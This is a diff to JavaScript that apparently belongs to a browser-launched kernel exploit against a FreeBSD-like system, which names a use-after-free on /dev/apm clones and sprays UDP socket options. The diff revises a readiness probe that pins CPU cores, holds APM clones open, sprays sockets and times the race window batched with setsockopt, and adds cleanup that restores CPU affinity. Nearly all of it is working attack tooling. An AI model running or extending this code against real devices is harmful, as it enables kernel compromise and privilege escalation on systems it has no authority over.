@@ -795,17 +795,19 @@ function pinCore() {
   mask.u8.fill(0);
   let rv = sc(S.cpuset_getaffinity, 3, 1, -1, 16, mask.at).i32;
   if (rv !== 0) return { ok: false, note: "getaffinity rv=" + rv };
+  const originalMask = mask.u8.slice();
 
   let core = -1, allowed = [];
   for (let b = 0; b < 128; b++) {
     if ((mask.u8[b >> 3] >> (b & 7)) & 1) { if (core < 0) core = b; allowed.push(b); }
   }
-  if (core < 0) return { ok: false, note: "no core in the mask" };
+  if (core < 0) return { ok: false, note: "no core in the mask", originalMask: originalMask };
 
   mask.u8.fill(0);
   mask.u8[core >> 3] = 1 << (core & 7);
   rv = sc(S.cpuset_setaffinity, 3, 1, -1, 16, mask.at).i32;
-  return { ok: rv === 0, core: core, allowed: allowed.join(","), note: "setaffinity rv=" + rv };
+  return { ok: rv === 0, core: core, allowed: allowed.join(","),
+           note: "setaffinity rv=" + rv, originalMask: originalMask };
 }
 
 /* ------------------------------------------------------- the payload */
@@ -1822,9 +1824,8 @@ function teardown(k, kbase, ofs, devs, queues, room) {
 
 /* ------------------------------------------------------------ the probe */
 
-/* Fires nothing. It opens device nodes without closing them, which is what
-   the exploit does anyway, and it opens and closes sockets. No unit is spent:
-   a unit is only spent when its clone is freed, and nothing is freed here. */
+/* No UAF trigger or kernel-memory write. It holds APM clones open until this
+   browser process exits, so a cold reboot is required before a later run. */
 export function probeAfterglow(ctx) {
   STATE.ctx = ctx;
   const out = { ok: false, reasons: [] };
@@ -1869,7 +1870,11 @@ export function probeAfterglow(ctx) {
   let node = null;
   for (let i = 0; i < PROBE_NODES.length; i++) {
     const fd = sc(S.open, cstr(PROBE_NODES[i]).at, 0).i32;
-    if (fd >= 0) { node = PROBE_NODES[i]; break; }
+    if (fd >= 0) {
+      node = PROBE_NODES[i];
+      if (sc(S.close, fd).i32 !== 0) no("probe descriptor did not close");
+      break;
+    }
   }
   out.probeNode = node;
   if (!node) no("no usable device node for the probe descriptor");
@@ -1885,13 +1890,18 @@ export function probeAfterglow(ctx) {
     if (fd < 0) break;
     held.push(fd);
   }
+  out.rebootRequired = held.length > 0;
+  out.clonesHeld = held.length;
   out.apm = held.length ? (held.length + " clones held") : ("refused, errno " + host().errno());
   if (!held.length) no("/dev/apm cannot be opened in this sandbox");
 
   const open = [], refused = [];
   for (let u = 0; u < 32; u++) {
     const fd = sc(S.open, cstr("/dev/apm" + u).at, 0).i32;
-    if (fd >= 0) { open.push(u); sc(S.close, fd); }
+    if (fd >= 0) {
+      open.push(u);
+      if (sc(S.close, fd).i32 !== 0) no("APM unit " + u + " did not close");
+    }
     else if (refused.length < 3) refused.push(u + ":e" + host().errno());
   }
   out.units = open.length;
@@ -1904,57 +1914,75 @@ export function probeAfterglow(ctx) {
   if (!pin.ok) no("cannot pin to a cpu: " + pin.note);
 
   const socks = [];
-  for (let i = 0; i < TUNE.sprays; i++) {
-    const fd = sc(S.socket, 2, 2, 0).i32;
-    if (fd < 0) break;
-    socks.push(fd);
-  }
-  out.udp = socks.length;
-
-  /* How wide the window would be. Setting the option allocates in the zone
-     the exploit uses, but nothing was freed here, so there is no hole to
-     win -- the sockets are closed again right after. */
-  if (socks.length) {
-    const body = alloc(TUNE.object); body.u8.fill(0);
-    const req = alloc(40);
-    req.dv.setUint32(0, 1, true);
-    pokeAt(req, 8, alloc(16).at);
-    req.dv.setUint32(16, 16, true);
-    pokeAt(req, 24, body.at);
-    req.dv.setUint32(32, TUNE.object, true);
-    /* Measure it the way the real run does it: batched and prebuilt.
-       Unbatched, the probe reported 16 ms where the run sits under one -- a
-       number pointing the wrong way is worse than no number. */
-    const stub = stubFor(S.setsockopt);
-    const nb = (host().prepareMany && host().runPrepared && stub) ? (STATE.batch || TUNE.batch) : 0;
-    let t0, t1;
-    if (nb) {
-      const calls = [];
-      for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
-      const fertig = [];
-      for (let i = 0; i < calls.length; i += nb) {
-        try { fertig.push(host().prepareMany(calls.slice(i, i + nb))); }
-        catch (e) { fertig.length = 0; break; }
-      }
-      if (fertig.length) {
-        host().runPrepared(fertig[0]);                       /* aufwaermen */
-        t0 = performance.now();
-        for (let i = 0; i < fertig.length; i++) host().runPrepared(fertig[i]);
-        t1 = performance.now();
-        out.window = (t1 - t0).toFixed(2) + " ms in " + fertig.length + " entries";
-      }
+  out.udp = 0;
+  try {
+    for (let i = 0; i < TUNE.sprays; i++) {
+      const fd = sc(S.socket, 2, 2, 0).i32;
+      if (fd < 0) break;
+      socks.push(fd);
     }
-    if (out.window === undefined) {
-      t0 = (typeof performance !== "undefined") ? performance.now() : Date.now();
-      for (let i = 0; i < socks.length; i++) sc(S.setsockopt, socks[i], 17, 128, req.at, 40);
-      t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
-      out.window = (t1 - t0).toFixed(1) + " ms, one entry each (no batching)";
-    }
-  } else out.window = "not measured";
+    out.udp = socks.length;
 
-  for (let i = 0; i < socks.length; i++) sc(S.close, socks[i]);
-  if (socks.length < TUNE.sprays) {
-    no("only " + socks.length + " udp sockets, " + TUNE.sprays + " is a hard floor");
+    /* Setting this option allocates in the same zone, but no APM clone has
+       been freed, so there is no UAF hole to win. */
+    if (socks.length) {
+      const body = alloc(TUNE.object); body.u8.fill(0);
+      const req = alloc(40);
+      req.dv.setUint32(0, 1, true);
+      pokeAt(req, 8, alloc(16).at);
+      req.dv.setUint32(16, 16, true);
+      pokeAt(req, 24, body.at);
+      req.dv.setUint32(32, TUNE.object, true);
+      const stub = stubFor(S.setsockopt);
+      const nb = (host().prepareMany && host().runPrepared && stub) ? (STATE.batch || TUNE.batch) : 0;
+      let t0, t1;
+      if (nb) {
+        const calls = [];
+        for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
+        const fertig = [];
+        for (let i = 0; i < calls.length; i += nb) {
+          try { fertig.push(host().prepareMany(calls.slice(i, i + nb))); }
+          catch (e) { fertig.length = 0; break; }
+        }
+        if (fertig.length) {
+          host().runPrepared(fertig[0]);
+          t0 = performance.now();
+          for (let i = 0; i < fertig.length; i++) host().runPrepared(fertig[i]);
+          t1 = performance.now();
+          out.window = (t1 - t0).toFixed(2) + " ms in " + fertig.length + " entries";
+        }
+      }
+      if (out.window === undefined) {
+        t0 = (typeof performance !== "undefined") ? performance.now() : Date.now();
+        for (let i = 0; i < socks.length; i++) sc(S.setsockopt, socks[i], 17, 128, req.at, 40);
+        t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
+        out.window = (t1 - t0).toFixed(1) + " ms, one entry each (no batching)";
+      }
+      let accepted = 0;
+      for (let i = 0; i < socks.length; i++)
+        if (sc(S.setsockopt, socks[i], 17, 128, req.at, 40).i32 === 0) accepted++;
+      out.optionsAccepted = accepted;
+      if (accepted < TUNE.sprays)
+        no("only " + accepted + " socket options succeeded, " + TUNE.sprays + " needed");
+    } else out.window = "not measured";
+    if (socks.length < TUNE.sprays)
+      no("only " + socks.length + " udp sockets, " + TUNE.sprays + " is a hard floor");
+  } catch (error) {
+    no("socket check stopped: " + (error && error.message ? error.message : String(error)));
+  } finally {
+    for (let i = 0; i < socks.length; i++) {
+      try { if (sc(S.close, socks[i]).i32 !== 0) no("socket close failed"); }
+      catch (_) { no("socket close threw"); }
+    }
+    out.pinRestored = true;
+    if (pin.originalMask) {
+      try {
+        const original = alloc(16);
+        original.u8.set(pin.originalMask);
+        out.pinRestored = sc(S.cpuset_setaffinity, 3, 1, -1, 16, original.at).i32 === 0;
+      } catch (_) { out.pinRestored = false; }
+      if (!out.pinRestored) no("CPU affinity was not restored");
+    }
   }
 
   out.ok = out.reasons.length === 0;
@@ -1966,8 +1994,10 @@ export function probeAfterglow(ctx) {
   say("probe units  " + out.units + " open: " + out.unitList);
   say("probe refused " + out.unitRefused);
   say("probe pin    " + out.pin);
+  say("probe restore " + (out.pinRestored ? "original CPU affinity" : "FAILED"));
   say("probe window " + out.window);
   say("probe UDP    " + out.udp + " of " + TUNE.sprays + " needed");
+  say("probe option " + (out.optionsAccepted || 0) + " of " + TUNE.sprays + " succeeded");
   say("probe SHOTS  " + out.units + " units, a run needs 3");
   if (out.ok) say("probe VERDICT usable");
   else for (let i = 0; i < out.reasons.length; i++) say("probe BLOCKED " + out.reasons[i]);
